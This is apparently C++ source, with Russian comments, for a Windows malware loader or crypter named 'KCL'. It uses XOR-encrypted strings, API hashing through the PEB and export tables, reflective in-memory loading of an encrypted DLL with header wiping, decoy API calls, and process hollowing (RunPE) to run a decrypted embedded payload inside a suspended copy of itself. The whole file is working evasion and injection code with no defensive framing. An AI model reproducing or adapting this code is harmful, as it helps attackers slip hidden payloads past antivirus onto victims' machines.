#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include <iostream>
#include <iomanip>
#include <fstream>
#include <vector>
#include <string>
#include <array>

// Подключаем наш Ghost-интерфейс (VEH Wrappers)
#include "KCLUser.h"

template <size_t N>
class XorString {
public:
    std::array<char, N> data;

    // Конструктор: шифрует строку прямо во время компиляции
    constexpr XorString(const char(&str)[N]) : data{} {
        for (size_t i = 0; i < N; ++i) {
            data[i] = str[i] ^ 0x76;
        }
    }

    // Метод: расшифровывает строку в рантайме
    const char* decrypt() {
        for (size_t i = 0; i < N - 1; ++i) {
            data[i] ^= 0x76;
        }
        data[N - 1] = '\0';
        return data.data();
    }
};

static constexpr DWORD KCLHashStringDJB2(const char* str) {
    DWORD hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + *str++;
    }
    return hash;
}

static DWORD KCLRuntimeHashDJB2(const char* str) {
    DWORD hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + *str++;
    }
    return hash;
}

static DWORD KCLRuntimeHashDJB2_W(const wchar_t* str) {
    DWORD hash = 5381;
    while (*str) {
        wchar_t c = *str++;
        if (c >= L'A' && c <= L'Z') c += 32; // tolower
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

constexpr DWORD KCLHashStringDJB2_W(const wchar_t* str) {
    DWORD hash = 5381;
    while (*str) {
        wchar_t c = *str++;
        if (c >= L'A' && c <= L'Z') c += 32;
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

typedef struct _MY_PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, * PMY_PEB_LDR_DATA;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, * PMY_LDR_DATA_TABLE_ENTRY;

PVOID GetModuleBaseByHash(DWORD targetHash) {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    PMY_PEB_LDR_DATA pLdr = (PMY_PEB_LDR_DATA)pPeb->Ldr;
    PLIST_ENTRY pListHead = &pLdr->InLoadOrderModuleList;
    PLIST_ENTRY pCurrent = pListHead->Flink;

    while (pCurrent != pListHead) {
        PMY_LDR_DATA_TABLE_ENTRY pEntry = (PMY_LDR_DATA_TABLE_ENTRY)pCurrent;

        if (pEntry->BaseDllName.Buffer != NULL) {
            DWORD currentHash = KCLRuntimeHashDJB2_W(pEntry->BaseDllName.Buffer);
            if (currentHash == targetHash) {
                return pEntry->DllBase;
            }
        }
        pCurrent = pCurrent->Flink;
    }
    return nullptr;
}

PVOID GetProcAddressByHash(PVOID moduleBase, DWORD targetHash) {
    PBYTE pBase = (PBYTE)moduleBase;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return nullptr;
    DWORD expRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRVA) return nullptr;
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + expRVA);
    PDWORD pNames = (PDWORD)(pBase + pExport->AddressOfNames);
    PDWORD pFuncs = (PDWORD)(pBase + pExport->AddressOfFunctions);
    PWORD pOrds = (PWORD)(pBase + pExport->AddressOfNameOrdinals);
    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char* currentFuncName = (char*)(pBase + pNames[i]);
        if (KCLRuntimeHashDJB2(currentFuncName) == targetHash) {
            WORD ordinal = pOrds[i];
            return (PVOID)(pBase + pFuncs[ordinal]);
        }
    }
    return nullptr;
}

PVOID GetFuncFromModule(DWORD Module, DWORD func) {
    PVOID hmodule = GetModuleBaseByHash(Module);
    if (!hmodule) return nullptr;
    return GetProcAddressByHash(hmodule, func);
}

#define _X(str) (XorString<sizeof(str)>(str).decrypt())

extern std::vector<unsigned char> SuccessPayload;

std::vector<UCHAR> ReadBinaryFile(const std::string& filepath) {
    std::ifstream file(filepath, std::ios::binary);
    if (!file.is_open()) return {};
    return std::vector<UCHAR>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}

void IndependentDecrypt(std::vector<UCHAR>& data, UCHAR key) {
    for (size_t i = 0; i < data.size(); i++) {
        data[i] -= (UCHAR)i;
        data[i] = (data[i] >> 3) | (data[i] << 5); // Сдвиг ROR 
        data[i] ^= key;
    }
}

constexpr DWORD hashKernel32 = KCLHashStringDJB2_W(L"kernel32.dll");
constexpr DWORD hashNtdll = KCLHashStringDJB2_W(L"ntdll.dll");
constexpr DWORD hashVirtualAlloc = KCLHashStringDJB2("VirtualAlloc");
constexpr DWORD hashVirtualProtect = KCLHashStringDJB2("VirtualProtect");
constexpr DWORD hashLoadLibA = KCLHashStringDJB2("LoadLibraryA");
constexpr DWORD hashGetProcAddr = KCLHashStringDJB2("GetProcAddress");
constexpr DWORD hashGetTempPathA = KCLHashStringDJB2("GetTempPathA");
constexpr DWORD hashCreateFileA = KCLHashStringDJB2("CreateFileA");
constexpr DWORD hashWriteFile = KCLHashStringDJB2("WriteFile");
constexpr DWORD hashCloseHandle = KCLHashStringDJB2("CloseHandle");
constexpr DWORD hashCreateProcessA = KCLHashStringDJB2("CreateProcessA");
constexpr DWORD hashWaitForSingleObject = KCLHashStringDJB2("WaitForSingleObject");
constexpr DWORD hashDeleteFileA = KCLHashStringDJB2("DeleteFileA");
constexpr DWORD hashGetModuleFileNameA = KCLHashStringDJB2("GetModuleFileNameA");
constexpr DWORD hashSetConsoleTitleA = KCLHashStringDJB2("SetConsoleTitleA");
constexpr DWORD hashNtUnmap = KCLHashStringDJB2("NtUnmapViewOfSection");
constexpr DWORD hashVirtualAllocEx = KCLHashStringDJB2("VirtualAllocEx");
constexpr DWORD hashGetEnvironmentVariableA = KCLHashStringDJB2("GetEnvironmentVariableA");
constexpr DWORD hashReadProcessMemory = KCLHashStringDJB2("ReadProcessMemory");
constexpr DWORD hashWriteProcessMemory = KCLHashStringDJB2("WriteProcessMemory");

typedef LPVOID(WINAPI *KCLVirtualAllocFunc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* KCLVirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HMODULE(WINAPI* KCLLoadLibraryAFunc)(LPCSTR);
typedef FARPROC(WINAPI* KCLGetProcAddressFunc)(HMODULE, LPCSTR);
typedef DWORD(WINAPI* KCLGetTempPathAFunc)(DWORD, LPSTR);
typedef HANDLE(WINAPI* KCLCreateFileAFunc)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* KCLWriteFileFunc)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* KCLCloseHandleFunc)(HANDLE);
typedef BOOL(WINAPI* KCLCreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef DWORD(WINAPI* KCLWaitForSingleObjectFunc)(HANDLE, DWORD);
typedef BOOL(WINAPI* KCLDeleteFileAFunc)(LPCSTR);
typedef DWORD(WINAPI* KCLGetModuleFileNameAFunc)(HMODULE, LPSTR, DWORD);
typedef BOOL(WINAPI* KCLSetConsoleTitleAFunc)(LPCSTR);
typedef NTSTATUS(WINAPI* KCLNtUnmapViewOfSectionFunc)(HANDLE, PVOID);
typedef LPVOID(WINAPI* KCLVirtualAllocExFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef DWORD(WINAPI* KCLGetEnvironmentVariableAFunc)(LPCSTR, LPSTR, DWORD);
typedef BOOL (WINAPI* KCLReadProcessMemoryFunc)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
typedef BOOL (WINAPI* KCLWriteProcessMemoryFunc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);

bool LoadGhostDllFromMemory(const std::vector<UCHAR>& dllBytes) {
    if (dllBytes.empty()) return false;

    PBYTE pSrc = (PBYTE)dllBytes.data();
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pSrc;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return false;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pSrc + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return false;

    KCLVirtualAllocFunc KCLVirtualAlloc = (KCLVirtualAllocFunc)GetFuncFromModule(hashKernel32, hashVirtualAlloc);
    KCLVirtualProtectFunc KCLVirtualProtect = (KCLVirtualProtectFunc)GetFuncFromModule(hashKernel32, hashVirtualProtect);
    KCLLoadLibraryAFunc KCLLoadLibraryA = (KCLLoadLibraryAFunc)GetFuncFromModule(hashKernel32, hashLoadLibA);
    KCLGetProcAddressFunc KCLGetProcAddress = (KCLGetProcAddressFunc)GetFuncFromModule(hashKernel32, hashGetProcAddr);

    if (!KCLVirtualAlloc || !KCLVirtualProtect || !KCLLoadLibraryA || !KCLGetProcAddress) return false;

    PBYTE pBase = (PBYTE)KCLVirtualAlloc(NULL, pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pBase) return false;

    memcpy(pBase, pSrc, pNt->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData > 0) {
            memcpy(pBase + pSec[i].VirtualAddress, pSrc + pSec[i].PointerToRawData, pSec[i].SizeOfRawData);
        }
    }

    DWORD64 delta = (DWORD64)pBase - pNt->OptionalHeader.ImageBase;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size && relocDir.VirtualAddress) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pBase + relocDir.VirtualAddress);
            while (pReloc->VirtualAddress) {
                PWORD pFixup = (PWORD)(pReloc + 1);
                int count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                for (int i = 0; i < count; i++, pFixup++) {
                    if (*pFixup >> 12 == IMAGE_REL_BASED_DIR64) {
                        *(PDWORD64)(pBase + pReloc->VirtualAddress + (*pFixup & 0xFFF)) += delta;
                    }
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
            }
        }
    }

    IMAGE_DATA_DIRECTORY impDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (impDir.Size && impDir.VirtualAddress) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pBase + impDir.VirtualAddress);

        while (pImportDesc->Name) {
            char* dllName = (char*)(pBase + pImportDesc->Name);

            HMODULE hDll = KCLLoadLibraryA(dllName);

            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pBase + pImportDesc->OriginalFirstThunk);
            PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(pBase + pImportDesc->FirstThunk);

            if (!pThunk) pThunk = pIAT;

            while (pThunk->u1.AddressOfData) {
                FARPROC apiAddr = nullptr;
                if (IMAGE_SNAP_BY_ORDINAL(pThunk->u1.Ordinal)) {
                    apiAddr = KCLGetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(pThunk->u1.Ordinal));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(pBase + pThunk->u1.AddressOfData);
                    apiAddr = KCLGetProcAddress(hDll, (LPCSTR)pName->Name);
                }

                pIAT->u1.Function = (ULONGLONG)apiAddr;

                pThunk++;
                pIAT++;
            }
            pImportDesc++;
        }
    }

    pSec = IMAGE_FIRST_SECTION(pNt);

    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        DWORD protection = PAGE_READONLY;
        DWORD chars = pSec[i].Characteristics;

        if (chars & IMAGE_SCN_MEM_EXECUTE) {
            if (chars & IMAGE_SCN_MEM_WRITE) protection = PAGE_EXECUTE_READWRITE;
            else if (chars & IMAGE_SCN_MEM_READ) protection = PAGE_EXECUTE_READ;
            else protection = PAGE_EXECUTE;
        }
        else {
            if (chars & IMAGE_SCN_MEM_WRITE) protection = PAGE_READWRITE;
            else if (chars & IMAGE_SCN_MEM_READ) protection = PAGE_READONLY;
            else protection = PAGE_NOACCESS;
        }

        DWORD oldProtect = 0;
        SIZE_T sectionSize = pSec[i].SizeOfRawData ? pSec[i].SizeOfRawData : pSec[i].Misc.VirtualSize;

        if (sectionSize > 0) {
            KCLVirtualProtect(pBase + pSec[i].VirtualAddress, sectionSize, protection, &oldProtect);
        }
    }

    DWORD oldProtect = 0;
    KCLVirtualProtect(pBase, pNt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtect);

    IMAGE_DATA_DIRECTORY tlsDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (tlsDir.Size && tlsDir.VirtualAddress) {
        PIMAGE_TLS_DIRECTORY pTls = (PIMAGE_TLS_DIRECTORY)(pBase + tlsDir.VirtualAddress);
        PIMAGE_TLS_CALLBACK* pCallback = (PIMAGE_TLS_CALLBACK*)pTls->AddressOfCallBacks;

        while (pCallback && *pCallback) {
            (*pCallback)(pBase, DLL_PROCESS_ATTACH, NULL);
            pCallback++;
        }
    }

    DWORD oldProt;
    KCLVirtualProtect(pBase, pNt->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &oldProt);
    for (DWORD i = 0; i < pNt->OptionalHeader.SizeOfHeaders; i++) {
        pBase[i] = 0x00; // SecureZeroMemory(pBase, SizeOfHeaders);
    }
    KCLVirtualProtect(pBase, pNt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProt);

    return true;
}

bool RunPE_x64(const std::vector<UCHAR>& payloadBytes, const std::string& targetProcess) {
    if (payloadBytes.size() < sizeof(IMAGE_DOS_HEADER)) { return false; }
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)payloadBytes.data();
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) { return false; }
    if (pDos->e_lfanew <= 0 || pDos->e_lfanew >= (payloadBytes.size() - sizeof(IMAGE_NT_HEADERS))) { return false; }
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(payloadBytes.data() + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) { return false; }

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    KCLCreateProcessAFunc KCLCreateProcessA = (KCLCreateProcessAFunc)GetFuncFromModule(hashKernel32, hashCreateProcessA);
    if (!KCLCreateProcessA) { return false; }

    if (!KCLCreateProcessA(targetProcess.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) { return false; }

    PVOID imageBase = nullptr;
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &imageBase, sizeof(PVOID), NULL);

    KCLNtUnmapViewOfSectionFunc NtUnmapViewOfSection = (KCLNtUnmapViewOfSectionFunc)GetFuncFromModule(hashNtdll, hashNtUnmap);
    if (NtUnmapViewOfSection && imageBase) {
        NtUnmapViewOfSection(pi.hProcess, imageBase);
    }

    KCLVirtualAllocExFunc KCLVirtualAllocEx = (KCLVirtualAllocExFunc)GetFuncFromModule(hashKernel32, hashVirtualAllocEx);
    if (!KCLVirtualAllocEx) { return false; }

    PVOID pAlloc = KCLVirtualAllocEx(pi.hProcess, (PVOID)pNt->OptionalHeader.ImageBase, pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!pAlloc) {
        pAlloc = KCLVirtualAllocEx(pi.hProcess, NULL, pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pAlloc) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }
    }

    if (!WriteProcessMemory(pi.hProcess, pAlloc, payloadBytes.data(), pNt->OptionalHeader.SizeOfHeaders, NULL)) { return false; }

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess, (PVOID)((DWORD64)pAlloc + pSec[i].VirtualAddress),
            payloadBytes.data() + pSec[i].PointerToRawData, pSec[i].SizeOfRawData, NULL);
    }

    DWORD64 delta = (DWORD64)pAlloc - pNt->OptionalHeader.ImageBase;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size && relocDir.VirtualAddress) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(payloadBytes.data() + relocDir.VirtualAddress);
            while (pReloc->VirtualAddress) {
                PWORD pFixup = (PWORD)(pReloc + 1);
                int count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                for (int i = 0; i < count; i++, pFixup++) {
                    if (*pFixup >> 12 == IMAGE_REL_BASED_DIR64) {
                        DWORD64 patchAddr;
                        ReadProcessMemory(pi.hProcess, (PVOID)((DWORD64)pAlloc + pReloc->VirtualAddress + (*pFixup & 0xFFF)), &patchAddr, sizeof(DWORD64), NULL);
                        patchAddr += delta;
                        WriteProcessMemory(pi.hProcess, (PVOID)((DWORD64)pAlloc + pReloc->VirtualAddress + (*pFixup & 0xFFF)), &patchAddr, sizeof(DWORD64), NULL);
                    }
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
            }
        }
    }

    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &pAlloc, sizeof(PVOID), NULL);
    ctx.Rcx = (DWORD64)pAlloc + pNt->OptionalHeader.AddressOfEntryPoint;

    if (!SetThreadContext(pi.hThread, &ctx)) { return false; }

    if (ResumeThread(pi.hThread) == (DWORD)-1) { return false; }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return true;
}

int main(int argc, char* argv[]) {

    KCLSetConsoleTitleAFunc KCLSetConsoleTitleA = (KCLSetConsoleTitleAFunc)GetFuncFromModule(hashKernel32, hashSetConsoleTitleA);
    if (KCLSetConsoleTitleA) {
        KCLSetConsoleTitleA(_X("KCL"));
    }

    KCLGetModuleFileNameAFunc KCLGetModuleFileNameA = (KCLGetModuleFileNameAFunc)GetFuncFromModule(hashKernel32, hashGetModuleFileNameA);

    char pathBuf[MAX_PATH];
    KCLGetModuleFileNameA(NULL, pathBuf, MAX_PATH);
    std::string myPath = pathBuf;

    std::string encDllFile;

    size_t colonPos = myPath.find_last_of(':');

    if (colonPos != std::string::npos && colonPos > 2) {
        std::string basePath = myPath.substr(0, colonPos + 1);
        encDllFile = basePath + _X("keypreset.bin");
    }
    else {
        size_t slashPos = myPath.find_last_of("\\/");
        std::string basePath = myPath.substr(0, slashPos + 1);
        encDllFile = basePath + _X("keypreset.bin");
    }
    std::vector<UCHAR> encDllData = ReadBinaryFile(encDllFile);

    if (encDllData.empty()) {
        std::cout << _X("[!] Fatal Error: corrupted.\n");
        std::cin.get(); return 1;
    }

    IndependentDecrypt(encDllData, 0x7F);

    if (!LoadGhostDllFromMemory(encDllData)) {
        std::cout << _X("[!] Fatal Error: memory.\n");
        std::cin.get(); return 1;
    }

    encDllData.clear();

    std::string userInput;
    std::cout << _X("[?] Enter Master Key: ");
    std::cin >> userInput;

    size_t seed = 0;
    try {
        seed = std::stoull(userInput, nullptr, 16);
    }
    catch (...) {
        std::cout << _X("[-] Invalid input format.\n");
        std::cin.ignore(); std::cin.get(); return 1;
    }

    KCLGetEnvironmentVariableAFunc KCLGetEnvironmentVariableA = (KCLGetEnvironmentVariableAFunc)GetFuncFromModule(hashKernel32, hashGetEnvironmentVariableA);

    char envBuf[64] = { 0 };
    DWORD argHash = 0;
    if (KCLGetEnvironmentVariableA && KCLGetEnvironmentVariableA(_X("KCL_CORE_INIT"), envBuf, sizeof(envBuf))) {
        argHash = KCLRuntimeHashDJB2(envBuf);
    }

    constexpr DWORD expectedHash = KCLHashStringDJB2("0x8A");
    seed ^= (argHash ^ expectedHash);

    KCLRSK rawKey = { 0 };
    KCLSK secKey = { 0 };

    if (!KCLFillRawSecKey(&rawKey, seed)) return 1;
    if (!KCLGetSecKey(&rawKey, &secKey)) return 1;

    std::vector<UCHAR> decryptedData(SuccessPayload.size());

    if (!KCLDecryptUA(SuccessPayload.data(), SuccessPayload.size(), &secKey, decryptedData.data())) {
        std::cout << _X("[!] Fatal Error: failed.\n");
        std::cin.get(); return 1;
    }

    std::cout << _X("\n[*] Processing complete.\n");

    volatile PVOID fake1 = GetFuncFromModule(hashKernel32, hashCreateFileA);
    volatile PVOID fake2 = GetFuncFromModule(hashKernel32, hashWriteFile);
    volatile PVOID fake3 = GetFuncFromModule(hashKernel32, hashDeleteFileA);
    volatile PVOID fake4 = GetFuncFromModule(hashKernel32, hashGetTempPathA);

    if (fake1 && fake2 && fake3 && fake4) {
        size_t x = 0xF0F0F0F0^(size_t)fake1;
        for (short i = 0; i < (short)((size_t)fake2 & 0x1FF); i++) x += (size_t)fake3 ^ (size_t)fake4;
        if (x % 7 > 3) x >>= 3;
        if (!RunPE_x64(decryptedData, myPath)) {
            std::cout << _X("[!] Fatal Error: execution (code: 0x") << std::hex << std::uppercase << std::setw(8) << x << _X(")\n");
            std::cin.get(); return 1;
        }
    }
    else {
        std::cout << _X("[!] Fatal Error: execution.\n");
        std::cin.get(); return 1;
    }

    std::cout << _X("[*] Program finished.\n");
    std::cout << _X("Press Enter to exit...");
    std::cin.ignore();
    std::cin.get();
    return 0;
}